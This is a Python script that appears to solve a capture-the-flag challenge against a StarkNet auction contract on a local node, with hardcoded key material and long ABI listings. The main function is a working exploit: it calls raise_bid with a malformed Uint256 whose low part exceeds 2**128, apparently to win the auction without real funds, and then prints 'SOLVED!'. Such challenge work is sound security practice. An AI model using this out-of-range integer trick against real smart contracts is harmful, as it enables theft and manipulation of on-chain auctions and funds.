import asyncio
from starknet_py.net.gateway_client import GatewayClient
from starknet_py.net.networks import TESTNET, MAINNET
from pathlib import Path
from starknet_py.net import AccountClient, KeyPair
from starknet_py.net.models.chains import StarknetChainId
from starknet_py.net.signer.stark_curve_signer import StarkCurveSigner
from starknet_py.contract import Contract
from starkware.python.utils import to_bytes
from starkware.starknet.public.abi import starknet_keccak
from starkware.starknet.core.os.contract_address.contract_address import \
    calculate_contract_address_from_hash


testnet = "testnet"
chain_id = StarknetChainId.TESTNET


async def main():
    node_url = "http://e347fb6a-0614-471b-b05b-c07974d4c20d@127.0.0.1:5050"
    contract_address = "0x45751c075fddfb039e814d751af4a853e5ffbe7d30eca992de9b0821a864219"
    private_key = "0xa91ecf00f05447fa3f6b52dd9604b008"

    gateway_client = GatewayClient(node_url, TESTNET)

    key_pair = KeyPair.from_private_key(key=int(private_key, 16))
    print(key_pair)

    player_public_key = key_pair.public_key
    print("Player public key", player_public_key)

    player_address = calculate_contract_address_from_hash(
        salt=20,
        class_hash=1803505466663265559571280894381905521939782500874858933595227108099796801620,
        constructor_calldata=[player_public_key],
        deployer_address=0,
    )
    print("Player address", player_address, hex(player_address))

    signer = StarkCurveSigner(player_address, key_pair, StarknetChainId.TESTNET)
    account_client = AccountClient(client=gateway_client,
                                   address=player_address, signer=signer)


    auction_contract = Contract(address=contract_address, abi=auctionABI, client=account_client)

    token_address = (await auction_contract.functions["token"].call()).token_address
    print("Token Address", token_address, hex(token_address))

    token_contract = Contract(address=token_address, abi=erc20ABI, client=account_client)

    my_balance = (await token_contract.functions["balanceOf"].call(player_address)).balance
    print("My Balance", my_balance)

    my_balance = (await auction_contract.functions["balanceOf"].call(player_address)).balance
    print("My Auction Balance", my_balance)

    my_balance = (await auction_contract.functions["auctionBalanceOf"].call(1, player_address)).balance
    print("Acution balance of 1:", my_balance)

    winner = (await auction_contract.functions["current_winner"].call(1)).current_winner
    print("Winner", winner, hex(winner))


    print("Raising bid")
    response = await account_client.execute(
        calls=[
            auction_contract.functions["raise_bid"].prepare(1, {"high": 0, "low":2**128+1}),
        ],
        max_fee=int(1e16)
    )
    await account_client.wait_for_tx(response.transaction_hash)

    winner = (await auction_contract.functions["current_winner"].call(1)).current_winner
    print("Winner", winner, hex(winner))

    if (winner == player_address):
        print("SOLVED!")


auctionABI = [
    {
        "members": [
            {
                "name": "low",
                "offset": 0,
                "type": "felt"
            },
            {
                "name": "high",
                "offset": 1,
                "type": "felt"
            }
        ],
        "name": "Uint256",
        "size": 2,
        "type": "struct"
    },
    {
        "inputs": [
            {
                "name": "token_address",
                "type": "felt"
            },
            {
                "name": "owner",
                "type": "felt"
            }
        ],
        "name": "constructor",
        "outputs": [],
        "type": "constructor"
    },
    {
        "inputs": [
            {
                "name": "account",
                "type": "felt"
            }
        ],
        "name": "balanceOf",
        "outputs": [
            {
                "name": "balance",
                "type": "Uint256"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [
            {
                "name": "auction_id",
                "type": "felt"
            },
            {
                "name": "account",
                "type": "felt"
            }
        ],
        "name": "auctionBalanceOf",
        "outputs": [
            {
                "name": "balance",
                "type": "Uint256"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "token",
        "outputs": [
            {
                "name": "token_address",
                "type": "felt"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [
            {
                "name": "auction_id",
                "type": "felt"
            }
        ],
        "name": "current_winner",
        "outputs": [
            {
                "name": "current_winner",
                "type": "felt"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [
            {
                "name": "auction_id",
                "type": "felt"
            }
        ],
        "name": "end_time",
        "outputs": [
            {
                "name": "end_time",
                "type": "felt"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "start_auction",
        "outputs": [],
        "type": "function"
    },
    {
        "inputs": [
            {
                "name": "amount",
                "type": "Uint256"
            }
        ],
        "name": "increase_credit",
        "outputs": [],
        "type": "function"
    },
    {
        "inputs": [
            {
                "name": "amount",
                "type": "Uint256"
            }
        ],
        "name": "withdraw_credit",
        "outputs": [],
        "type": "function"
    },
    {
        "inputs": [
            {
                "name": "auction_id",
                "type": "felt"
            },
            {
                "name": "amount",
                "type": "Uint256"
            }
        ],
        "name": "raise_bid",
        "outputs": [],
        "type": "function"
    },
    {
        "inputs": [
            {
                "name": "auction_id",
                "type": "felt"
            },
            {
                "name": "amount",
                "type": "Uint256"
            }
        ],
        "name": "unlock_funds",
        "outputs": [],
        "type": "function"
    }
]

erc20ABI = [
    {
        "members": [
            {
                "name": "low",
                "offset": 0,
                "type": "felt"
            },
            {
                "name": "high",
                "offset": 1,
                "type": "felt"
            }
        ],
        "name": "Uint256",
        "size": 2,
        "type": "struct"
    },
    {
        "data": [
            {
                "name": "from_",
                "type": "felt"
            },
            {
                "name": "to",
                "type": "felt"
            },
            {
                "name": "value",
                "type": "Uint256"
            }
        ],
        "keys": [],
        "name": "Transfer",
        "type": "event"
    },
    {
        "data": [
            {
                "name": "owner",
                "type": "felt"
            },
            {
                "name": "spender",
                "type": "felt"
            },
            {
                "name": "value",
                "type": "Uint256"
            }
        ],
        "keys": [],
        "name": "Approval",
        "type": "event"
    },
    {
        "inputs": [
            {
                "name": "name",
                "type": "felt"
            },
            {
                "name": "symbol",
                "type": "felt"
            },
            {
                "name": "decimals",
                "type": "felt"
            },
            {
                "name": "initial_supply",
                "type": "Uint256"
            },
            {
                "name": "recipient",
                "type": "felt"
            }
        ],
        "name": "constructor",
        "outputs": [],
        "type": "constructor"
    },
    {
        "inputs": [],
        "name": "name",
        "outputs": [
            {
                "name": "name",
                "type": "felt"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "symbol",
        "outputs": [
            {
                "name": "symbol",
                "type": "felt"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "totalSupply",
        "outputs": [
            {
                "name": "totalSupply",
                "type": "Uint256"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "decimals",
        "outputs": [
            {
                "name": "decimals",
                "type": "felt"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [
            {
                "name": "account",
                "type": "felt"
            }
        ],
        "name": "balanceOf",
        "outputs": [
            {
                "name": "balance",
                "type": "Uint256"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [
            {
                "name": "owner",
                "type": "felt"
            },
            {
                "name": "spender",
                "type": "felt"
            }
        ],
        "name": "allowance",
        "outputs": [
            {
                "name": "remaining",
                "type": "Uint256"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [
            {
                "name": "recipient",
                "type": "felt"
            },
            {
                "name": "amount",
                "type": "Uint256"
            }
        ],
        "name": "transfer",
        "outputs": [
            {
                "name": "success",
                "type": "felt"
            }
        ],
        "type": "function"
    },
    {
        "inputs": [
            {
                "name": "sender",
                "type": "felt"
            },
            {
                "name": "recipient",
                "type": "felt"
            },
            {
                "name": "amount",
                "type": "Uint256"
            }
        ],
        "name": "transferFrom",
        "outputs": [
            {
                "name": "success",
                "type": "felt"
            }
        ],
        "type": "function"
    },
    {
        "inputs": [
            {
                "name": "spender",
                "type": "felt"
            },
            {
                "name": "amount",
                "type": "Uint256"
            }
        ],
        "name": "approve",
        "outputs": [
            {
                "name": "success",
                "type": "felt"
            }
        ],
        "type": "function"
    },
    {
        "inputs": [
            {
                "name": "spender",
                "type": "felt"
            },
            {
                "name": "added_value",
                "type": "Uint256"
            }
        ],
        "name": "increaseAllowance",
        "outputs": [
            {
                "name": "success",
                "type": "felt"
            }
        ],
        "type": "function"
    },
    {
        "inputs": [
            {
                "name": "spender",
                "type": "felt"
            },
            {
                "name": "subtracted_value",
                "type": "Uint256"
            }
        ],
        "name": "decreaseAllowance",
        "outputs": [
            {
                "name": "success",
                "type": "felt"
            }
        ],
        "type": "function"
    }
]


if __name__ == '__main__':
    asyncio.run(main())
